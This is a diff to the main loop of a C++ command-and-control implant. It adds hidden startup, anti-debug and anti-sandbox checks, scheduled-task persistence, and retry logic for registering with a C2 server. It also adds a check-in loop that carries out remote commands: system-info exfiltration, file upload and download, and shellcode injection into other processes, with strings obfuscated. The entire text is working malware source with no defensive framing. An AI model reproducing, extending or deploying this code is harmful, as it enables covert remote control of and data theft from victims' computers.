@@ -29,23 +29,51 @@ using namespace andrivet::ADVobfuscator;
 
 MalleableProfile *currentProfile;
 
+void LoopRegister(string privKey, string pubKey)
+{
+	while (TRUE)
+	{
+		float sleeptime = currentProfile->retryWait + (currentProfile->retryWait * currentProfile->jitter);
+		if (DetectSleepSkip(sleeptime * 1000))
+		{
+			DEBUG_PRINTF("Sleep skipped, exiting\n");
+			exit(1);
+		}
+
+		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
+
+	}
+}
+
 int main()
 {
+
+	#ifndef DEBUG
+	 Sleep(INITIAL_SLEEP_SECONDS * 1000);
+	 FreeConsole();
+	#endif
+
 	if (sodium_init() < 0)
 	{
 		return 1;
 	}
 
-	// Anti Debug
-	StartAntiDebugThread();
+	if (USE_ANTIDEBUG){
+		// Anti Debug
+		StartAntiDebugThread();
+	}
 
-	// Anti Sandbox
-	MemeIfSandboxed();
+	if (USE_ANTISANDBOX){
+		// Anti Sandbox
+		MemeIfSandboxed();
+	}
 
-	// Persistence
-	wchar_t *pSelfImplantPath =  GetImplantPath();
-	int task_status = createScheduledTask(pSelfImplantPath, SysAllocString(L"15:30:00"));
-
+	if (SCHTASK_PERSIST)
+	{
+		// Persistence
+		wchar_t *pSelfImplantPath = GetImplantPath();
+		int task_status = createScheduledTask(pSelfImplantPath, SysAllocString(L"15:30:00"));
+	}
 
 	string privKey;
 	string pubKey;
@@ -57,31 +85,43 @@ int main()
 		exit(1);
 	}
 
-	currentProfile = Register(C2_URL, pubKey, privKey);
+	while (TRUE) {
+		int tries = 0;
+		currentProfile = Register(toWide(C2_URL), pubKey, privKey);
 
-	if (currentProfile == NULL)
-	{
-		DEBUG_PRINTF("Error registering, aborting\n");
-		exit(1);
+		if (currentProfile == NULL)
+		{
+			DEBUG_PRINTF("Error registering, aborting\n");
+			if (tries >= REGISTER_MAX_RETRIES){
+				DEBUG_PRINTF("Max retries reached, exiting\n");
+				exit(1);
+			}
+			tries++;
+		} else {
+			break;
+		}
 	}
+	
 
 	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());
 
 	// do stuff with the response
 	Sleep(1);
 
-
 	// Checkin loop
 	while (TRUE)
 	{
-		float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
-		// Sleep(currentProfile->sleep * 1000);
-		if(DetectSleepSkip(5000))
+		#ifndef DEBUG
+			float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
+		#else
+			float sleeptime = 5.f;
+		#endif
+		if (DetectSleepSkip(sleeptime * 1000))
 		{
 			DEBUG_PRINTF("Sleep skipped, exiting\n");
 			exit(1);
 		}
-		Task *newTask = Checkin(C2_URL, currentProfile);
+		Task *newTask = Checkin(toWide(C2_URL), currentProfile);
 		if (newTask == NULL)
 		{
 			continue;
@@ -91,7 +131,7 @@ int main()
 		int opcode = newTask->opcode;
 		bool success = false;
 		DEBUG_PRINTF("Opcode: %d\n", opcode);
-		
+
 		PrintJsonType(newTask->args);
 
 		if (opcode == OPCODE_CMD)
@@ -106,7 +146,7 @@ int main()
 		{
 			string sysInfo = SysInfo();
 			success = true;
-			if (!SendTaskResult(newTask->taskId.c_str(), C2_URL, sysInfo.c_str(), success, currentProfile))
+			if (!SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), sysInfo.c_str(), success, currentProfile))
 			{
 				DEBUG_PRINTF("Error sending output\n");
 			}
@@ -120,20 +160,23 @@ int main()
 				continue;
 			}
 			Sleep(numSeconds * 1000);
-			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", true, currentProfile);
 		}
-		else if (opcode == OPCODE_UPDATE_CONFIG) {
-			rapidjson::Value* changes = newTask->args;
+		else if (opcode == OPCODE_UPDATE_CONFIG)
+		{
+			rapidjson::Value *changes = newTask->args;
 			UpdateProfile(changes, currentProfile);
-			SendTaskResult(newTask->taskId.c_str(), C2_URL, "", true, currentProfile);
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), "", true, currentProfile);
 		}
-		else if (opcode == OPCODE_DOWNLOAD) {
+		else if (opcode == OPCODE_DOWNLOAD)
+		{
 			std::string result = Download(newTask->args->GetString());
 			// see if `ERROR` is the start of the string, very hacky
 			success = result.compare(0, 5, OBFUSCATED("ERROR")) != 0;
-			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, success, currentProfile);
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, success, currentProfile);
 		}
-		else if (opcode == OPCODE_UPLOAD) {
+		else if (opcode == OPCODE_UPLOAD)
+		{
 			// Print type of args
 			rapidjson::Type argsType = newTask->args->GetType();
 			DEBUG_PRINTF("Args type: %d\n", argsType);
@@ -144,15 +187,15 @@ int main()
 			std::string b64content = arr[1].GetString();
 			DEBUG_PRINTF("Uploading %s\n", fileName.c_str());
 			std::string result = Upload(fileName, b64content);
-			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
-		else if (opcode == OPCODE_INJECT) {
+		else if (opcode == OPCODE_INJECT)
+		{
 			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
 			std::string shellcode = arr[0].GetString();
 			std::string processName = arr[1].GetString();
 			std::string result = Inject(shellcode, processName);
-			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
-
+			SendTaskResult(newTask->taskId.c_str(), toWide(C2_URL), result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
 	}
 }
